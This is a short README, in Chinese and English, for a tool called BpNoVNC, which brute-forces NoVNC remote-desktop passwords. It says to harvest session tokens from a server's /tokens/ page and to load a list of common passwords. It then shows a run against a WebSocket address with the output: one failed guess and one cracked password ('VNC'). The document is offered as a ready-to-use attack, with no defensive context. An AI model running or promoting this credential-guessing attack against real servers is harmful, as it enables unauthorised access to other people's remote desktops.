# BpNoVNC
爆破NoVNC

* token.txt:默认为空,通常在http://1.2.1.1:6080/tokens/ 页面复制到token.txt
* pass.txt:常用密码

```
(py3) ➜  BpNoVNC git:(master) ✗ python BpNoVNC.py -t ws://2.1.1.1:6080 -tf token.txt -pf pass.txt

B)bbbb           N)n   nn         V)    vv N)n   nn   C)ccc
B)   bb          N)nn  nn         V)    vv N)nn  nn  C)   cc
B)bbbb   p)PPPP  N) nn nn  o)OOO  V)    vv N) nn nn C)
B)   bb  p)   PP N)  nnnn o)   OO  V)  vv  N)  nnnn C)
B)    bb p)   PP N)   nnn o)   OO   V)vv   N)   nnn  C)   cc
B)bbbbb  p)PPPP  N)    nn  o)OOO     V)    N)    nn   C)ccc
         p)
         p)
                                                        V 1.o
                                                        BY Freev

[-]: ws://2.1.1.1:6080/?token=5039b165-053e-a58b-cde8-325f669e2008 password:123456
[+]: ws://2.1.1.1:6080/?token=5039b165-053e-a58b-cde8-325f669e2008 password:VNC
```
